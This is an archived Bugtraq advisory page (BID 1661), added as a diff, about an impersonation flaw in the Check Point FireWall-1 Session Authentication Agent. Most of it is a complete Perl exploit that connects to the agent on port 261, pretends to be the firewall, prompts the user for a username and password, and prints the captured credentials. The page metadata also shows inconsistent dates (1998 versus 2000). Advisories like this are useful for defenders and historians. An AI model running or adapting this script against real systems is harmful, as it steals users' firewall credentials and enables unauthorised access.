@@ -1,0 +1,100 @@
+#SpeeDr00t@Black Falcon<br>#bid1661<p><b><span style="font-size: 18pt;">Check Point Firewall-1 Session Agent Impersonation Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1661/info">info</a><br><a href="http://www.securityfocus.com/bid/1661/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1661/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1661/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1661/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1661
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Unknown
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Sep 24 1998 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Sep 24 1998 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was posted to the Bugtraq mailing list on September 24, 2000 by Larry Pingree &lt;larryp@secure-it.net&gt;
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Check Point Software Firewall-1 4.0 <br/>
+					
+				
+					Check Point Software Firewall-1 3.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Check Point Software Firewall-1 4.1 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<br/> #!/usr/bin/perl -w<br/> #<br/> # This script connects to a FireWall-1 Session Authentication Agent<br/> # running on Windows 95/NT.  It attempts to "authenticate" the remote<br/> # user and returns the resulting username/password.<br/> #<br/> # The agent supports configuration of up to three IP addresses which<br/> # are allowed to submit authentication requests.  If there are three<br/> # addresses configured, the user is presented with the following when<br/> # an unknown host connects:<br/> #<br/> #    "Authentication request from this IP Address is not allowed."<br/> #                            OK <br/> #<br/> # If there are only one or two addresses allowed, the user gets this<br/> # nice little dialog box:<br/> #<br/> #    "Do you want to enter this IP to the Firewall-1 list"<br/> #               YES  (default)           NO <br/> #<br/> # Guess which button your typical user will click on?<br/> #<br/> # If the agent closes the connection prematurely, you will get strange<br/> # results.<br/> #<br/> # tested vs. FW-1 Authentication Agent 1.1<br/> #<br/> # Andrew Danforth &lt;acd@weirdness.net&gt;<br/><br/> require 5.000;<br/><br/> use Socket;<br/> use Getopt::Std;<br/><br/> $| = 1;<br/><br/> $FIREWALL_NAME = "Corporate Firewall";<br/> $PASSWORD_PROMPT = "FireWall-1 password";<br/> $PORT = 261;<br/><br/> die unless getopts('n:p:');<br/><br/> unless ($TARGET_IP = shift) {<br/>    print "usage: $0 -n firewall_name -p password_prompt target_ip\n";<br/>    exit(1);<br/> }<br/><br/> $FIREWALL_NAME = $opt_n if (defined $opt_n);<br/> $PASSWORD_PROMPT = $opt_p if (defined $opt_p);<br/><br/> socket(SOCK, AF_INET, SOCK_STREAM, getprotobyname('tcp')) || die "socket: $!";<br/> connect(SOCK, sockaddr_in($PORT, inet_aton($TARGET_IP))) || die "connect: $!";<br/><br/> select(SOCK); $| = 1; select(STDOUT);<br/><br/> print SOCK "220 FW-1 Session Authentication Request from $FIREWALL_NAME\n\r";<br/> print "sent greeting\n";<br/> print SOCK "331 User:\n\r";<br/> print "sent user request\n";<br/> $username = &amp;get_response;<br/> print "username entered: $username\n";<br/> print SOCK "331 *$PASSWORD_PROMPT:\n\r";<br/> $password = &amp;get_response;<br/> print "password entered: $password\n";<br/> print SOCK "200 User $username authenticated by FireWall-1 authentication.\n\r";<br/> print SOCK "230 OK\n\r";<br/><br/> sub get_response {<br/>    # this is ugly but it works.  the session agent doesn't seem to send proper newlines.<br/>    my $input;<br/>    $input .= $key while($key = getc SOCK and ord($key));<br/>    return $input;<br/> }
+	
+		<ul>
+</ul>
+</div>
